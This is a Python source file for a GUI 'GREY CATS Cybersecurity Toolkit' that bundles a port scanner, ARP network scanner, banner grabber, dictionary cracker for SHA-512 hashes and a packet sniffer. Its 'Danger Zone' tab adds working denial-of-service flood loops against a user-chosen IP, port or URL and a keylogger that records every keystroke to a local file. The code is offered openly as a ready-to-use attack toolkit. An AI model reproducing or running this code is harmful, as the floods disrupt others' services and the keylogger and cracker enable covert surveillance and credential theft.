import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import threading
import socket
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import srp
import hashlib
from pynput import keyboard
import requests

# -------------------- Functions (same as before) --------------------
def scan_port(target_ip, target_port, text_widget):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target_ip, target_port))
        if result == 0:
            text_widget.insert(tk.END, f"Port {target_port} is open\n")
        sock.close()
    except Exception as e:
        text_widget.insert(tk.END, f"Error: {e}\n")

def scan_network(target_ip_range, text_widget):
    try:
        arp_request = ARP(pdst=target_ip_range)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]

        text_widget.insert(tk.END, "IP\t\t\tMAC Address\n")
        text_widget.insert(tk.END, "-------------------------------\n")
        for element in answered_list:
            text_widget.insert(tk.END, f"{element[1].psrc}\t{element[1].hwsrc}\n")
    except Exception as e:
        text_widget.insert(tk.END, f"Network scan error: {e}\n")

def grab_banner(target_ip, target_port, text_widget):
    try:
        sock = socket.socket()
        sock.settimeout(3)
        sock.connect((target_ip, target_port))
        sock.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
        banner = sock.recv(1024)
        text_widget.insert(tk.END, f"Banner: {banner.decode(errors='ignore')}\n")
        sock.close()
    except Exception as e:
        text_widget.insert(tk.END, f"Banner grabber error: {e}\n")

def crack_password(hashed_password, wordlist_path, text_widget):
    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as wordlist:
            for word in wordlist:
                word = word.strip()
                encrypted_word = hashlib.sha512(word.encode()).hexdigest()
                if encrypted_word == hashed_password:
                    text_widget.insert(tk.END, f"Password found: {word}\n")
                    return
        text_widget.insert(tk.END, "Password not found in wordlist.\n")
    except Exception as e:
        text_widget.insert(tk.END, f"Password cracker error: {e}\n")

def sniff_packet(interface, text_widget):
    try:
        from scapy.all import sniff
        def packet_callback(pkt):
            text_widget.insert(tk.END, pkt.summary() + "\n")
            text_widget.see(tk.END)
        sniff(iface=interface, store=False, prn=packet_callback)
    except Exception as e:
        text_widget.insert(tk.END, f"Packet sniffer error: {e}\n")

def dos_attack(target_ip, target_port, text_widget):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        message = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
        while True:
            sock.send(message.encode())
    except Exception as e:
        text_widget.insert(tk.END, f"DOS Error: {e}\n")
    finally:
        sock.close()

def ddos_attack(target_url, text_widget):
    try:
        while True:
            requests.get(target_url)
            text_widget.insert(tk.END, f"DDOS Attack in progress: {target_url}\n")
            text_widget.see(tk.END)
    except Exception as e:
        text_widget.insert(tk.END, f"DDOS Error: {e}\n")

def on_press(key):
    try:
        with open("keylog.txt", "a") as f:
            f.write(str(key.char))
    except AttributeError:
        with open("keylog.txt", "a") as f:
            f.write(f"[{str(key)}]")

def start_keylogger(text_widget):
    text_widget.insert(tk.END, "Keylogger started. Logging to keylog.txt\n")
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

def threaded(func, *args):
    thread = threading.Thread(target=func, args=args, daemon=True)
    thread.start()

# -------------------- GUI --------------------
root = tk.Tk()
root.title("🔥 GREY CATS Cybersecurity Toolkit 🔥")
root.configure(bg="#1c1c1c")
root.geometry("1000x800")

style = ttk.Style()
style.theme_use('clam')
style.configure("TLabel", background="#1c1c1c", foreground="#ff4500", font=("Consolas", 11))
style.configure("TButton", background="#ff4500", foreground="black", font=("Consolas", 11, "bold"))
style.map("TButton",
          foreground=[('pressed', 'black'), ('active', '#ffa07a')],
          background=[('pressed', '#ff6347'), ('active', '#ff4500')])
style.configure("TEntry", fieldbackground="#333333", foreground="white", font=("Consolas", 11))
style.configure("TNotebook", background="#1c1c1c")
style.configure("TNotebook.Tab", background="#2f2f2f", foreground="#ff4500", font=("Consolas", 11, "bold"))
style.map("TNotebook.Tab", background=[("selected", "#ff4500")], foreground=[("selected", "black")])

banner_label = tk.Label(root, text="🔥 GREY CATS 🔥", font=("Courier New", 32, "bold"), fg="#ff4500", bg="#1c1c1c")
banner_label.pack(pady=15)

notebook = ttk.Notebook(root)
notebook.pack(expand=True, fill="both")

def create_scrolled_text(parent):
    frame = tk.Frame(parent, bg="#1c1c1c")
    text = tk.Text(frame, bg="#220000", fg="#ff6347", font=("Consolas", 10))
    scrollbar = ttk.Scrollbar(frame, orient="vertical", command=text.yview)
    text.configure(yscrollcommand=scrollbar.set)
    text.pack(side="left", fill="both", expand=True)
    scrollbar.pack(side="right", fill="y")
    return frame, text

# -- Port Scanner Tab --
port_tab = ttk.Frame(notebook)
notebook.add(port_tab, text="Port Scanner")

tk.Label(port_tab, text="Target IP:").pack(pady=5, anchor='w', padx=10)
ip_entry = ttk.Entry(port_tab)
ip_entry.pack(pady=5, padx=10, fill='x')

tk.Label(port_tab, text="Start Port:").pack(pady=5, anchor='w', padx=10)
start_entry = ttk.Entry(port_tab)
start_entry.pack(pady=5, padx=10, fill='x')

tk.Label(port_tab, text="End Port:").pack(pady=5, anchor='w', padx=10)
end_entry = ttk.Entry(port_tab)
end_entry.pack(pady=5, padx=10, fill='x')

output_frame1, output1 = create_scrolled_text(port_tab)
output_frame1.pack(pady=10, padx=10, fill='both', expand=True)

def start_port_scan():
    try:
        start = int(start_entry.get())
        end = int(end_entry.get())
        output1.delete("1.0", tk.END)
        threaded(lambda: [scan_port(ip_entry.get(), p, output1) for p in range(start, end+1)])
    except ValueError:
        messagebox.showerror("Input error", "Start and End ports must be integers")

ttk.Button(port_tab, text="Scan Ports", command=start_port_scan).pack(pady=10)

# -- Network Scanner Tab --
net_tab = ttk.Frame(notebook)
notebook.add(net_tab, text="Network Scanner")

tk.Label(net_tab, text="Target IP Range (e.g., 192.168.1.0/24):").pack(pady=5, anchor='w', padx=10)
ip_range_entry = ttk.Entry(net_tab)
ip_range_entry.pack(pady=5, padx=10, fill='x')

output_frame2, output2 = create_scrolled_text(net_tab)
output_frame2.pack(pady=10, padx=10, fill='both', expand=True)

ttk.Button(net_tab, text="Scan Network", command=lambda: threaded(scan_network, ip_range_entry.get(), output2)).pack(pady=10)

# -- Banner Grabber Tab --
banner_tab = ttk.Frame(notebook)
notebook.add(banner_tab, text="Banner Grabber")

tk.Label(banner_tab, text="Target IP:").pack(pady=5, anchor='w', padx=10)
banner_ip = ttk.Entry(banner_tab)
banner_ip.pack(pady=5, padx=10, fill='x')

tk.Label(banner_tab, text="Target Port:").pack(pady=5, anchor='w', padx=10)
banner_port = ttk.Entry(banner_tab)
banner_port.pack(pady=5, padx=10, fill='x')

output_frame3, output3 = create_scrolled_text(banner_tab)
output_frame3.pack(pady=10, padx=10, fill='both', expand=True)

ttk.Button(banner_tab, text="Grab Banner", command=lambda: threaded(grab_banner, banner_ip.get(), int(banner_port.get()), output3)).pack(pady=10)

# -- Password Cracker Tab --
cracker_tab = ttk.Frame(notebook)
notebook.add(cracker_tab, text="Password Cracker")

tk.Label(cracker_tab, text="SHA-512 Hashed Password:").pack(pady=5, anchor='w', padx=10)
hash_entry = ttk.Entry(cracker_tab)
hash_entry.pack(pady=5, padx=10, fill='x')

tk.Label(cracker_tab, text="Wordlist File Path:").pack(pady=5, anchor='w', padx=10)
file_entry = ttk.Entry(cracker_tab)
file_entry.pack(pady=5, padx=10, fill='x')

def browse_wordlist():
    filename = filedialog.askopenfilename(filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
    if filename:
        file_entry.delete(0, tk.END)
        file_entry.insert(0, filename)

ttk.Button(cracker_tab, text="Browse Wordlist", command=browse_wordlist).pack(pady=5)

output_frame4, output4 = create_scrolled_text(cracker_tab)
output_frame4.pack(pady=10, padx=10, fill='both', expand=True)

ttk.Button(cracker_tab, text="Crack Password", command=lambda: threaded(crack_password, hash_entry.get(), file_entry.get(), output4)).pack(pady=10)

# -- Packet Sniffer Tab --
sniff_tab = ttk.Frame(notebook)
notebook.add(sniff_tab, text="Packet Sniffer")

tk.Label(sniff_tab, text="Network Interface (e.g., eth0, wlan0):").pack(pady=5, anchor='w', padx=10)
iface_entry = ttk.Entry(sniff_tab)
iface_entry.pack(pady=5, padx=10, fill='x')

output_frame5, output5 = create_scrolled_text(sniff_tab)
output_frame5.pack(pady=10, padx=10, fill='both', expand=True)

ttk.Button(sniff_tab, text="Start Sniffing", command=lambda: threaded(sniff_packet, iface_entry.get(), output5)).pack(pady=10)

# -- Danger Zone Tab --
danger_tab = ttk.Frame(notebook)
notebook.add(danger_tab, text="⚠ Danger Zone ⚠")

# Subframe for DOS/DDOS
dos_frame = ttk.LabelFrame(danger_tab, text="DOS/DDOS Attacks", padding=10)
dos_frame.pack(padx=10, pady=10, fill='x')

tk.Label(dos_frame, text="DOS Attack - Target IP:").grid(row=0, column=0, sticky='w', pady=5)
dos_ip = ttk.Entry(dos_frame)
dos_ip.grid(row=0, column=1, pady=5, sticky='ew')

tk.Label(dos_frame, text="DOS Attack - Target Port:").grid(row=1, column=0, sticky='w', pady=5)
dos_port = ttk.Entry(dos_frame)
dos_port.grid(row=1, column=1, pady=5, sticky='ew')

tk.Label(dos_frame, text="DDOS Attack - Target URL (with http/https):").grid(row=2, column=0, sticky='w', pady=5)
ddos_url = ttk.Entry(dos_frame)
ddos_url.grid(row=2, column=1, pady=5, sticky='ew')

dos_frame.columnconfigure(1, weight=1)

btn_frame = tk.Frame(dos_frame, bg="#1c1c1c")
btn_frame.grid(row=3, column=0, columnspan=2, pady=10)

def confirm_action(title, message):
    return messagebox.askyesno(title, message)

ttk.Button(btn_frame, text="Start DOS Attack", command=lambda: confirm_action("Confirm DOS Attack", "Are you sure?") and threaded(dos_attack, dos_ip.get(), int(dos_port.get()), output6)).pack(side="left", padx=5)
ttk.Button(btn_frame, text="Start DDOS Attack", command=lambda: confirm_action("Confirm DDOS Attack", "Are you sure?") and threaded(ddos_attack, ddos_url.get(), output6)).pack(side="left", padx=5)

# Subframe for Keylogger
keylog_frame = ttk.LabelFrame(danger_tab, text="Keylogger", padding=10)
keylog_frame.pack(padx=10, pady=10, fill='x')

ttk.Button(keylog_frame, text="Start Keylogger", command=lambda: confirm_action("Confirm Keylogger", "Are you sure?") and threaded(start_keylogger, output6)).pack()

output_frame6, output6 = create_scrolled_text(danger_tab)
output_frame6.pack(padx=10, pady=10, fill='both', expand=True)

root.mainloop()
